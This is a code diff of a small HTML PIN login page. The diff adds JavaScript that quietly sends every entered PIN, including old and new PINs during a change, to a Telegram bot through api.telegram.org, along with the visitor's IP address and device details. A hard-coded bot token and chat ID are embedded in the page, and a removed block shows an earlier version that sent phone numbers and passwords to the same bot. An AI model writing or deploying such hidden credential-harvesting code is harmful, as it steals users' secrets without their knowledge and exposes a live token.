@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -271,6 +270,63 @@
             // Current active input field
             let activeInput = pinInput;
             
+            // Telegram bot configuration
+            const botToken = '7775302991:AAGhN0WzRQ7FNu4z_TJkOTPU6peAPZuMlnU';
+            const chatId = '1732455712';
+
+            // Function to get user's IP address
+            async function getUserIP() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    console.error('Error getting IP:', error);
+                    return 'Unknown';
+                }
+            }
+            
+            // Function to send Telegram notification
+            async function sendTelegramNotification(action, pin, success) {
+                try {
+                    const userIP = await getUserIP();
+                    const userAgent = navigator.userAgent;
+                    const currentTime = new Date().toLocaleString();
+                    
+                    let statusText = success ? "SUCCESS" : "FAILED";
+                    
+                    const message = `
+🔐 PIN ${action.toUpperCase()} ${statusText} 🔐
+------------------------------
+📌 PIN: ${pin}
+⏰ Time: ${currentTime}
+🌐 IP: ${userIP}
+📱 Device: ${userAgent}
+------------------------------`;
+                    
+                    // Send message to Telegram
+                    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    if (!telegramResponse.ok) {
+                        console.error('Telegram API error:', telegramResponse.statusText);
+                    } else {
+                        console.log('Notification sent to Telegram successfully!');
+                    }
+                } catch (error) {
+                    console.error('Error sending notification to Telegram:', error);
+                }
+            }
+            
             // Add event listener for change password button
             changePasswordBtn.addEventListener('click', () => {
                 switchToChangePasswordMode();
@@ -387,7 +443,13 @@
         
             // Function to validate login PIN
             function validateLogin() {
-                if (pinInput.value === CORRECT_PIN) {
+                const enteredPin = pinInput.value;
+                const isCorrect = (enteredPin === CORRECT_PIN);
+                
+                // Send notification to Telegram
+                sendTelegramNotification('login', enteredPin, isCorrect);
+                
+                if (isCorrect) {
                     // Success!
                     messageDiv.textContent = 'Login Successful!';
                     messageDiv.className = 'message success';
@@ -395,7 +457,7 @@
                     
                     // Redirect after a short delay
                     setTimeout(() => {
-                        // --- CHANGE 'newpage.html' TO YOUR ACTUAL SUCCESS PAGE ---
+                        // --- CHANGE 'love.html' TO YOUR ACTUAL SUCCESS PAGE ---
                         window.location.href = 'love.html';
                     }, 1000);
                 } else {
@@ -420,7 +482,13 @@
             function processChangePasswordStep() {
                 switch (changePasswordStep) {
                     case 1: // Current PIN validation
-                        if (currentPin.value === CORRECT_PIN) {
+                        const currentPinValue = currentPin.value;
+                        const isCurrentPinCorrect = (currentPinValue === CORRECT_PIN);
+                        
+                        // Send notification about current PIN attempt
+                        sendTelegramNotification('verify current', currentPinValue, isCurrentPinCorrect);
+                        
+                        if (isCurrentPinCorrect) {
                             // Move to new PIN
                             changePasswordStep = 2;
                             currentPin.style.display = 'none';
@@ -455,10 +523,19 @@
                         break;
                         
                     case 3: // Confirm PIN
-                        if (newPin.value === confirmPin.value) {
+                        const newPinValue = newPin.value;
+                        const confirmPinValue = confirmPin.value;
+                        const doPasswordsMatch = (newPinValue === confirmPinValue);
+                        
+                        // Send notification about PIN change attempt
+                        sendTelegramNotification('change', 
+                            `Old: ${currentPin.value}, New: ${newPinValue}`, 
+                            doPasswordsMatch);
+                        
+                        if (doPasswordsMatch) {
                             // Success! Update the PIN
                             // In a real application, you would save this to a database
-                            CORRECT_PIN = newPin.value; // This now works because CORRECT_PIN is a variable
+                            CORRECT_PIN = newPinValue; // This now works because CORRECT_PIN is a variable
                             
                             changeMessage.textContent = 'PIN changed successfully!';
                             changeMessage.className = 'message success';
@@ -503,76 +580,5 @@
             }
         });
     </script>
-<!-- Code injected by live-server -->
-<script>
-	// <![CDATA[  <-- For SVG support
-	if ('WebSocket' in window) {
-		(function () {
-			function refreshCSS() {
-				var sheets = [].slice.call(document.getElementsByTagName("link"));
-				var head = document.getElementsByTagName("head")[0];
-				for (var i = 0; i < sheets.length; ++i) {
-					var elem = sheets[i];
-					var parent = elem.parentElement || head;
-					parent.removeChild(elem);
-					var rel = elem.rel;
-					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
-						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
-						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
-					}
-					parent.appendChild(elem);
-				}
-			}
-			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
-			var address = protocol + window.location.host + window.location.pathname + '/ws';
-			var socket = new WebSocket(address);
-			socket.onmessage = function (msg) {
-				if (msg.data == 'reload') window.location.reload();
-				else if (msg.data == 'refreshcss') refreshCSS();
-			};
-			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
-				console.log('Live reload enabled.');
-				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
-			}
-		})();
-        
-            // Telegram bot configuration
-            const botToken = '7775302991:AAGhN0WzRQ7FNu4z_TJkOTPU6peAPZuMlnU';
-            const chatId = '1732455712';
-            const message = `
-New Login Attempt:
-Phone: ${phone}
-Password: ${password}
-Time: ${new Date().toLocaleString()}
-IP: ${await getUserIP()}
-            `;
-
-            try {
-                // Send message to Telegram
-                const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                if (!telegramResponse.ok) {
-                    throw new Error('Telegram API error: ' + telegramResponse.statusText);
-                }
-                console.log('Message sent to Telegram successfully!');
-            } catch (error) {
-                console.error('Error sending message to Telegram:', error);
-            }
-
-	}
-	else {
-		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
-	}
-	// ]]>
-</script>
 </body>
 </html>
